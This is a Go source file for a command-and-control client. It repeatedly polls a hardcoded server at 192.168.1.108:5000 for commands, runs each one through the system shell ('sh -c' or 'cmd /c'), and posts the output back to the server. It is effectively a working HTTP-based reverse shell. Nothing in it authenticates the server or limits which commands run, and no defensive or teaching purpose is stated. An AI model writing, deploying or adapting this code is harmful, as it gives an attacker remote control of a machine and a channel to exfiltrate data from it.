package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unicode"
)

// CommandResponse represents the JSON structure for commands from the server
type CommandResponse struct {
	Command string `json:"command"`
}

// OutputRequest represents the JSON structure for sending output to the server
type OutputRequest struct {
	Output string `json:"output"`
}

// executeCommand executes a system command and returns its output
func executeCommand(command string) string {
	var cmd *exec.Cmd
	
	// Determine the shell to use based on the operating system
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	// Capture both stdout and stderr
	var out bytes.Buffer
	var errOut bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errOut
	
	// Execute the command
	err := cmd.Run()
	
	// Combine stdout and stderr
	output := out.String()
	if errOut.String() != "" {
		output += "\n" + errOut.String()
	}
	
	// If command failed and produced no output, return error message
	if err != nil && output == "" {
		exitCode := 1
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		}
		output = "ERROR: Command failed with exit code " + strconv.Itoa(exitCode)
	}
	
	return output
}

// jsonEscape escapes special characters for JSON format
func jsonEscape(str string) string {
	var buf bytes.Buffer
	json.HTMLEscape(&buf, []byte(str))
	return buf.String()
}

// extractCommand extracts the command from JSON response
func extractCommand(jsonStr string) string {
	var cmdResp CommandResponse
	err := json.Unmarshal([]byte(jsonStr), &cmdResp)
	if err != nil {
		return ""
	}
	return cmdResp.Command
}

// httpGetJSON performs HTTP GET request and returns the response body
func httpGetJSON(client *http.Client, url string) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	
	return string(body), nil
}

// httpPostJSON performs HTTP POST request with JSON body
func httpPostJSON(client *http.Client, url string, jsonBody string) error {
	// Create the output request structure
	outputReq := OutputRequest{Output: jsonBody}
	jsonData, err := json.Marshal(outputReq)
	if err != nil {
		return err
	}
	
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	// Read and ignore the response body
	_, err = io.ReadAll(resp.Body)
	return err
}

// isControlCharacter checks if a rune is a control character
func isControlCharacter(r rune) bool {
	return unicode.IsControl(r) && r != '\n' && r != '\r' && r != '\t'
}

// cleanOutput removes control characters that might break JSON parsing
func cleanOutput(output string) string {
	return strings.Map(func(r rune) rune {
		if isControlCharacter(r) {
			return -1 // remove character
		}
		return r
	}, output)
}

func main() {
	// Server configuration
	serverURL := "http://192.168.1.108:5000"
	commandEndpoint := "/command"
	outputEndpoint := "/output"
	
	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	
	fmt.Println("Connected to server. Waiting for commands...")
	
	// Main command loop
	for {
		// Poll server for new commands
		cmdBody, err := httpGetJSON(client, serverURL+commandEndpoint)
		if err != nil {
			fmt.Printf("GET /command failed: %v\n", err)
			time.Sleep(5 * time.Second) // Wait 5 seconds before retrying
			continue
		}
		
		// Extract command from JSON response
		command := extractCommand(cmdBody)
		if command == "" {
			time.Sleep(2 * time.Second) // No command available, wait 2 seconds
			continue
		}
		
		fmt.Printf("Received command: %s\n", command)
		
		// Check for exit condition
		if command == "exit" || command == "quit" {
			fmt.Println("Exit command received. Shutting down...")
			break
		}
		
		// Execute the command and capture output
		output := executeCommand(command)
		// Clean the output to remove problematic control characters
		cleanOutput := cleanOutput(output)
		fmt.Printf("Command output (%d bytes)\n", len(cleanOutput))
		
		// Send output back to server
		err = httpPostJSON(client, serverURL+outputEndpoint, cleanOutput)
		if err != nil {
			fmt.Printf("POST /output failed: %v\n", err)
		} else {
			fmt.Println("Output sent to server.")
		}
		
		// Small delay before next poll
		time.Sleep(1 * time.Second)
	}
}